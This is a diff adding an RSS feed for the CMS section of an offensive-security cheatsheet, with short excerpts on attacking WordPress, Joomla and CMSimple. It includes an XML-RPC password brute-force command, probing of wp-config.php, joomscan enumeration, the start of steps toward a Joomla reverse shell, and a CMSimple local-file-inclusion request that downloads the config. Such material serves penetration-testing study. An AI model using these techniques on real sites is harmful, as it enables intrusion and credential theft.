@@ -1,0 +1,61 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Content Management Systems (CMS) on Offensive Security Cheatsheet</title>
+    <link>/web-attacks/content-management-system-cms/</link>
+    <description>Recent content in Content Management Systems (CMS) on Offensive Security Cheatsheet</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    
+	<atom:link href="/web-attacks/content-management-system-cms/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Wordpress</title>
+      <link>/web-attacks/content-management-system-cms/wordpress/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/content-management-system-cms/wordpress/</guid>
+      <description>General &amp;amp; Tricks # Username can be guessed on WordPress since the username will generate a different error message if it doesn&amp;#39;t exist. # Interesting files https://monsite.com/robots.txt https://monsite.com/feed https://monsite.com/readme.html https://monsite.com/xmlrpc.php # Configuration files https://monsite.com/.htaccess https://monsite.com/wp-config.php # Directory listing https://monsite.com/wp-includes # XML-RPC attack (https://github.com/1N3/Wordpress-XMLRPC-Brute-Force-Exploit) # You can bruteforce users ./wp-xml-brute http://target.com/xmlrpc.php passwords.txt username1 # If by any way you can upload files, go check /upload or /uploads for your files</description>
+    </item>
+    
+    <item>
+      <title>Drupal</title>
+      <link>/web-attacks/content-management-system-cms/drupal/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/content-management-system-cms/drupal/</guid>
+      <description>TODO</description>
+    </item>
+    
+    <item>
+      <title>Joomla!</title>
+      <link>/web-attacks/content-management-system-cms/joomla/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/content-management-system-cms/joomla/</guid>
+      <description>Scanning and Enumeration # Get components running on the website joomscan --url http://10.10.10.150/ --random-agent --enumerate-components # You can also check /administrator/manifests/files/joomla.xml # If you find components, you can often access the configuration file # JCE component → /components/com_jce/jce.xml # Check for vulnerabilities affecting components # Joomlavs is also a good scanning tool https://github.com/rastating/joomlavs 
+Reverse Shell # You must first log as admin # Then you must activate the PHP extension in settings System → Component → Media → “php” in legal extensions and nothing in ignored extension # If it&amp;#39;s not enough and the manager is detecting malicious PHP upload, you can still edit templates # For example, the /index.</description>
+    </item>
+    
+    <item>
+      <title>Magento</title>
+      <link>/web-attacks/content-management-system-cms/magento/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/content-management-system-cms/magento/</guid>
+      <description>TODO</description>
+    </item>
+    
+    <item>
+      <title>MISC &amp; Others</title>
+      <link>/web-attacks/content-management-system-cms/others/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/content-management-system-cms/others/</guid>
+      <description>CMSimple # CMSimple LFI index.php ?sl=../adm&amp;amp;file=config&amp;amp;action=download&amp;amp;adm=1 
+NanoCMS # Password and sensitive data leak [url]/data/pagesdata.</description>
+    </item>
+    
+  </channel>
+</rss>
